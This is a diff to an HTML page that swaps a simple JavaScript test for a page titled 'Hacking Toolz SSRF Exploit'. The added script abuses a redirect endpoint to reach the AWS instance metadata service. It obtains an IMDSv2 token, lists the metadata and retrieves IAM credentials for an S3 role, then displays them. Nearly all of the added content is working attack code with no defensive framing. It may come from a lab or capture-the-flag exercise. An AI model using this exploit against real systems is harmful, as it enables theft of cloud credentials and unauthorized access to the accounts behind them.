@@ -1,24 +1,38 @@
 <html>
-    <h1>JavaScript Execution Test</h1>
-    <div id="test">If you see this, JavaScript is NOT working</div>
-    <div id="time"></div>
-    <div id="simple-xhr"></div>
-    
+    <h1>Hacking Toolz SSRF Exploit</h1>
+    <div id="tokenResponse"></div>
+    <div id="metadataResponse"></div>
+    <div id="credentialsResponse"></div>
+    <div id="error"></div>
     <script>
-        // Test 1: Basic DOM manipulation
-        document.getElementById("test").innerHTML = "SUCCESS: JavaScript is working!";
+        var tokenUrl = "http://localhost/redir.php?url=http://169.254.169.254/latest/api/token";
+        var metadataURL = "http://localhost/redir.php?url=http://169.254.169.254/latest/meta-data/";
+        var credentialsURL = "http://localhost/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/S3Role";
+        var xhr = new XMLHttpRequest();
+        var token = '';
         
-        // Test 2: Show current time
-        document.getElementById("time").innerHTML = "Current time: " + new Date().toString();
-        
-        // Test 3: Simple XHR test
         try {
-            var xhr = new XMLHttpRequest();
-            xhr.open('GET', 'http://localhost/redir.php?url=https://httpbin.org/get', false);
+            // Step 1: Get AWS IMSv2 token
+            xhr.open('PUT', tokenUrl, false);
+            xhr.setRequestHeader('X-aws-ec2-metadata-token-ttl-seconds', '21600');
             xhr.send();
-            document.getElementById("simple-xhr").innerHTML = "<h3>XHR Test Result:</h3><pre>" + xhr.responseText.substring(0, 500) + "...</pre>";
-        } catch(e) {
-            document.getElementById("simple-xhr").innerHTML = "<h3>XHR Error:</h3><pre>" + e.message + "</pre>";
+            token = xhr.responseText;
+            document.getElementById("tokenResponse").innerHTML = "<h3>Token Response:</h3><pre>" + token + "</pre>";
+
+            // Step 2: Get metadata directory listing
+            xhr.open('GET', metadataURL, false);
+            xhr.setRequestHeader('X-aws-ec2-metadata-token', token);
+            xhr.send();
+            document.getElementById("metadataResponse").innerHTML = "<h3>Metadata Response:</h3><pre>" + xhr.responseText + "</pre>";
+            
+            // Step 3: Get S3 credentials directly
+            xhr.open('GET', credentialsURL, false);
+            xhr.setRequestHeader('X-aws-ec2-metadata-token', token);
+            xhr.send();
+            document.getElementById("credentialsResponse").innerHTML = "<h3>S3 Credentials:</h3><pre style='word-wrap: break-word; white-space: pre-wrap;'>" + xhr.responseText + "</pre>";
+            
+        } catch(err) {
+            document.getElementById('error').innerHTML = "<h3>Error:</h3><pre>" + err.message + "</pre>";
         }
     </script>
 </html>
